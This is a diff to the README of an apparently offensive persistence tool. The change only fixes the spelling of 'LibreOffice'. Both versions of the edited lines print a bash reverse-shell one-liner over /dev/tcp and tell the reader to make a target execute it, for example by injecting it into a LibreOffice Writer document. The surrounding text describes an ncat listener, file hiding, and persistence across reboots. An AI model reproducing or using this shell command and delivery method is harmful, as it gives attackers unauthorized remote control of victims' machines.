@@ -5,8 +5,8 @@ pid, persisting through reboots. It also hides the files needed to perform the a
 
 ---Usage---
 
-The first thing you have to do is to somehow make the target execute this code (for example, by injecting it to a Libre 
-Office Writer document): bash -c "bash &>/dev/tcp/ip/port  0>&1 &". ip and port are the ones in the phantom-init file.
+The first thing you have to do is to somehow make the target execute this code (for example, by injecting it to a LibreOffice 
+Writer document): bash -c "bash &>/dev/tcp/ip/port  0>&1 &". ip and port are the ones in the phantom-init file.
 
 phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the phantom file. Change 
 the ip and port and also the location of the phantom file.
